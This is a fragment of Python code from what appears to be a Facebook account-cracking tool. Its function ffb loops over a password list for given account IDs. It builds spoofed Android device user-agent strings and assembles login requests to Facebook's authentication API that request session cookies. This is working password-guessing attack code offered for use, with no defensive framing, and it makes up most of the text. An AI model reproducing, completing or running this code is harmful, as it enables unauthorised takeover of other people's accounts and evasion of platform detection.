...
def ffb(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        en = random.choice(['en_US;FBBV'])
                        cph = random.choice(['CPH2235','CPH2283','CPH2287','CPH3005','CPH3009','CPH3015','CPH3059','CPH3061','CPH3065','CPH3069','CPH3071','CPH3073','CPH3077','CPH3091','CPH3095','CPH3099','CPH3137','CPH3139','CPH3145','CPH3161','CPH3185','CPH3201','CPH3209','CPH2801','CPH2803','CPH2805','CPH2809','CPH2827','CPH2837','CPH2851','CPH2853'])
                        network = random.choice(['airtel ,Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/Orca-Android;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAV/111.0.0.48.81;FBBV/121473359;FBDM/{density=2.75,width=1080,height=2030};FBLC/en_US;FBBV/121473359;FBCR/airtel;FBMF/FBBD/OPPO;FBDV/Host: b-graph.facebook.com;FBDV/FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/302.0.0.45.119;FBBV/268946177;FBDM/{density=2.625,width=1080,height=2131};FBLC/en_US;FBRV/270234409;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/Host: b-graph.facebook.com;FBDV/SM-A505FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:']"
...
'x-fb-connection-token': 'ef0e330bff1cd312f36aa5f2c69c59a9',
 'Connection': 'Keep-Alive'}
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'pt_BR','client_country_code': 'BR','fb_api_req_friendly_name':'authenticate','api_key':'882a8490361da98702bf97a021ddc14d','access_token':accees_token}
